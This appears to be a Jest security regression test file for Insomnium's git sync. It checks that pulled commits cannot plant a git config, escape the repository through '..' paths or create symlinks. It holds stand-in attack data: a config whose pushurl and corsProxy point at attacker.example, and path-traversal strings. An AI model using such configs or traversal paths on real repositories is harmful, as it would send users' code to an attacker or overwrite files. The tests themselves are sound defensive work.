import fs from 'node:fs';
import os from 'node:os';
import path from 'node:path';

import { describe, expect, it } from '@jest/globals';
import * as git from 'isomorphic-git';

import { fsClient } from '../fs-client';
import GitVCS, { GIT_CLONE_DIR, GIT_INSOMNIA_DIR, GIT_INTERNAL_DIR } from '../git-vcs';
import { MemClient } from '../mem-client';
import { routableFSClient } from '../routable-fs-client';

const author = { name: 'a', email: 'a@example.com', timestamp: 1, timezoneOffset: 0 };
const PLANTED_CONFIG = `[core]
\trepositoryformatversion = 0
\tbare = false
[remote "origin"]
\turl = https://github.com/owner/repo.git
\tfetch = +refs/heads/*:refs/remotes/origin/*
\tpushurl = https://attacker.example/steal.git
[http]
\tcorsProxy = https://attacker.example/proxy
`;

// the layout git-actions.tsx sets up: the work tree, .insomnium and the git dir in separate stores
const appLayout = () => {
  const workTree = MemClient.createClient();
  const gitData = MemClient.createClient();
  const fs = routableFSClient(workTree, { [GIT_INSOMNIA_DIR]: MemClient.createClient(), [GIT_INTERNAL_DIR]: gitData });
  return { workTree, gitData, fs, opts: { fs, dir: GIT_CLONE_DIR, gitdir: GIT_INTERNAL_DIR } };
};

describe('the internal git dir', () => {
  it('cannot be written by a pulled repository file at git/config', async () => {
    const { workTree, opts } = appLayout();
    await git.init({ ...opts, defaultBranch: 'main' });
    await git.addRemote({ ...opts, remote: 'origin', url: 'https://github.com/owner/repo.git', force: true });
    await opts.fs.promises.mkdir(GIT_INSOMNIA_DIR);
    await opts.fs.promises.writeFile(`${GIT_INSOMNIA_DIR}/a.txt`, 'hello');
    await git.add({ ...opts, filepath: '.insomnium/a.txt' });
    const first = await git.commit({ ...opts, message: 'one', author });

    // a commit that adds git/config to the work tree
    const insomnium = await git.writeTree({ ...opts, tree: [{ mode: '100644', path: 'a.txt', oid: await git.writeBlob({ ...opts, blob: Buffer.from('hello') }), type: 'blob' }] });
    const gitFolder = await git.writeTree({ ...opts, tree: [{ mode: '100644', path: 'config', oid: await git.writeBlob({ ...opts, blob: Buffer.from(PLANTED_CONFIG) }), type: 'blob' }] });
    const tree = await git.writeTree({ ...opts, tree: [
      { mode: '040000', path: '.insomnium', oid: insomnium, type: 'tree' },
      { mode: '040000', path: 'git', oid: gitFolder, type: 'tree' },
    ] });
    const planted = await git.writeCommit({ ...opts, commit: { message: 'plant\n', tree, parent: [first], author, committer: author } });
    await git.writeRef({ ...opts, ref: 'refs/heads/incoming', value: planted });

    // what a pull does after fetching
    await git.merge({ ...opts, ours: 'main', theirs: 'incoming', author });
    await git.checkout({ ...opts, ref: 'main' });

    expect(await git.getConfig({ ...opts, path: 'remote.origin.pushurl' })).toBeUndefined();
    expect(await git.getConfig({ ...opts, path: 'http.corsProxy' })).toBeUndefined();
    // it is just a work-tree file
    expect((await workTree.promises.readFile('git/config')).toString()).toBe(PLANTED_CONFIG);
  });

  it('is cleaned of a pushurl or corsProxy planted before this fix when the repo is opened', async () => {
    const { opts } = appLayout();
    await git.init({ ...opts, defaultBranch: 'main' });
    // more entries than any fixed cap
    for (let n = 0; n < 101; n++) {
      await git.setConfig({ ...opts, path: 'remote.origin.pushurl', value: `https://attacker.example/steal-${n}.git`, append: true });
      await git.setConfig({ ...opts, path: 'http.corsProxy', value: `https://attacker.example/proxy-${n}`, append: true });
    }

    await GitVCS.init({ uri: '', repoId: '', directory: GIT_CLONE_DIR, fs: opts.fs, gitDirectory: GIT_INTERNAL_DIR });

    expect(await git.getConfig({ ...opts, path: 'remote.origin.pushurl' })).toBeUndefined();
    expect(await git.getConfig({ ...opts, path: 'http.corsProxy' })).toBeUndefined();
  });

  // isomorphic-git's parser gives a header the section's path, so unsetting the
  // key would drop the header and re-parent the lines below into [remote "origin"]
  it.each([
    ['a quoted subsection with a dot', '[remote "origin.pushurl"]', '[http "corsproxy"]'],
    ['a legacy dotted header', '[remote.origin.pushurl]', '[http.corsProxy]'],
  ])('is cleaned of a pushurl or corsProxy hidden behind %s', async (_, pushHeader, proxyHeader) => {
    const { gitData, opts } = appLayout();
    await git.init({ ...opts, defaultBranch: 'main' });
    await gitData.promises.writeFile(`${GIT_INTERNAL_DIR}/config`, [
      '[core]', '\trepositoryformatversion = 0', '\tbare = false',
      '[remote "origin"]', '\turl = https://github.com/owner/repo.git', '\tfetch = +refs/heads/*:refs/remotes/origin/*',
      pushHeader, '\tpushurl = https://attacker.example/steal.git',
      '[http]', proxyHeader, '\tcorsProxy = https://attacker.example/proxy', '',
    ].join('\n'));

    // what gitRepoAction does when it opens the repo
    await GitVCS.init({ uri: '', repoId: '', directory: GIT_CLONE_DIR, fs: opts.fs, gitDirectory: GIT_INTERNAL_DIR });
    await GitVCS.setAuthor('a', 'a@example.com');
    await GitVCS.addRemote('https://github.com/owner/repo.git');

    expect(await git.getConfig({ ...opts, path: 'remote.origin.pushurl' })).toBeUndefined();
    expect(await git.getConfig({ ...opts, path: 'http.corsProxy' })).toBeUndefined();
    expect(await git.getConfig({ ...opts, path: 'remote.origin.url' })).toBe('https://github.com/owner/repo.git');
  });

  it('leaves a config Insomnium wrote untouched', async () => {
    const { gitData, opts } = appLayout();
    await git.init({ ...opts, defaultBranch: 'main' });
    await git.addRemote({ ...opts, remote: 'origin', url: 'https://github.com/owner/repo.git' });
    await git.setConfig({ ...opts, path: 'user.name', value: 'a' });
    await git.setConfig({ ...opts, path: 'branch.main.remote', value: 'origin' });
    await git.setConfig({ ...opts, path: 'branch.main.merge', value: 'refs/heads/main' });
    const before = (await gitData.promises.readFile(`${GIT_INTERNAL_DIR}/config`)).toString();

    await GitVCS.init({ uri: '', repoId: '', directory: GIT_CLONE_DIR, fs: opts.fs, gitDirectory: GIT_INTERNAL_DIR });

    expect((await gitData.promises.readFile(`${GIT_INTERNAL_DIR}/config`)).toString()).toBe(before);
  });
});

describe('a pulled commit on disk', () => {
  // the real layout: fsClient folders under a repo dir, as git-actions.tsx sets up
  const diskLayout = () => {
    const root = fs.mkdtempSync(path.join(os.tmpdir(), 'insomnium-git-'));
    const baseDir = path.join(root, 'repo');
    const routed = routableFSClient(fsClient(path.join(baseDir, 'other')), { [GIT_INSOMNIA_DIR]: MemClient.createClient(), [GIT_INTERNAL_DIR]: fsClient(baseDir) });
    return { root, baseDir, opts: { fs: routed, dir: GIT_CLONE_DIR, gitdir: GIT_INTERNAL_DIR } };
  };
  const blob = (opts: any, text: string) => git.writeBlob({ ...opts, blob: Buffer.from(text) });
  const pull = async (opts: any, entries: (prev: string) => Promise<any[]>) => {
    await git.init({ ...opts, defaultBranch: 'main' });
    const first = await git.commit({ ...opts, message: 'one', author, tree: await git.writeTree({ ...opts, tree: [] }) });
    const tree = await git.writeTree({ ...opts, tree: await entries(first) });
    const incoming = await git.writeCommit({ ...opts, commit: { message: 'incoming\n', tree, parent: [first], author, committer: author } });
    await git.writeRef({ ...opts, ref: 'refs/heads/incoming', value: incoming });
    await git.merge({ ...opts, ours: 'main', theirs: 'incoming', author });
    await git.checkout({ ...opts, ref: 'main' }).catch(() => {});
  };

  it('cannot write outside the repository through a tree entry named ..', async () => {
    const { root, opts } = diskLayout();
    await pull(opts, async () => {
      // ../git/config is the real git config; ../../escaped.txt is outside the repo folder
      const config = await git.writeTree({ ...opts, tree: [{ mode: '100644', path: 'config', oid: await blob(opts, PLANTED_CONFIG), type: 'blob' }] });
      const escape = await git.writeTree({ ...opts, tree: [{ mode: '100644', path: 'escaped.txt', oid: await blob(opts, 'pwned'), type: 'blob' }] });
      const up = await git.writeTree({ ...opts, tree: [
        { mode: '040000', path: '..', oid: escape, type: 'tree' },
        { mode: '040000', path: 'git', oid: config, type: 'tree' },
      ] });
      return [{ mode: '040000', path: '..', oid: up, type: 'tree' }];
    });
    expect(await git.getConfig({ ...opts, path: 'remote.origin.pushurl' })).toBeUndefined();
    expect(fs.existsSync(path.join(root, 'escaped.txt'))).toBe(false);
  });

  it('stores a symlink as a file holding its target, never as a link', async () => {
    const { baseDir, opts } = diskLayout();
    await pull(opts, async () => [{ mode: '120000', path: 'evil', oid: await blob(opts, '/git/config'), type: 'blob' }]);
    const stored = path.join(baseDir, 'other', 'evil');
    expect(fs.lstatSync(stored).isSymbolicLink()).toBe(false);
    expect(fs.readFileSync(stored, 'utf8')).toBe('/git/config');
  });
});

describe('fsClient', () => {
  it('refuses paths outside its folder', async () => {
    const base = fs.mkdtempSync(path.join(os.tmpdir(), 'insomnium-fs-'));
    const client = fsClient(path.join(base, 'inner')).promises;
    await expect(client.writeFile('../outside.txt', 'x')).rejects.toThrow('outside');
    expect(fs.existsSync(path.join(base, 'outside.txt'))).toBe(false);
  });
});

describe('routableFSClient', () => {
  it('routes by whole path segments', async () => {
    const workTree = MemClient.createClient();
    const gitData = MemClient.createClient();
    const fs = routableFSClient(workTree, { [GIT_INTERNAL_DIR]: gitData }).promises;
    await fs.writeFile('gitfoo.txt', 'a');
    await fs.mkdir('git');
    await fs.writeFile('git/config', 'b');
    await fs.mkdir(GIT_INTERNAL_DIR);
    await fs.writeFile(`${GIT_INTERNAL_DIR}/config`, 'c');
    expect((await workTree.promises.readFile('gitfoo.txt')).toString()).toBe('a');
    expect((await workTree.promises.readFile('git/config')).toString()).toBe('b');
    expect((await gitData.promises.readFile(`${GIT_INTERNAL_DIR}/config`)).toString()).toBe('c');
    await expect(gitData.promises.readFile('gitfoo.txt')).rejects.toThrow();
  });

  it.each([
    '../outside.txt',
    `${GIT_INTERNAL_DIR}/refs/remotes/origin/../../../config`, // a server's ref name
    'a/../b.txt', // normalizes inside, but poisons the index
    'C:\\..\\..\\git\\config',
  ])('refuses %s, which goes through ..', async filePath => {
    const fs = routableFSClient(MemClient.createClient(), { [GIT_INTERNAL_DIR]: MemClient.createClient() }).promises;
    await expect(fs.writeFile(filePath, 'x')).rejects.toThrow("goes through '..'");
  });
});
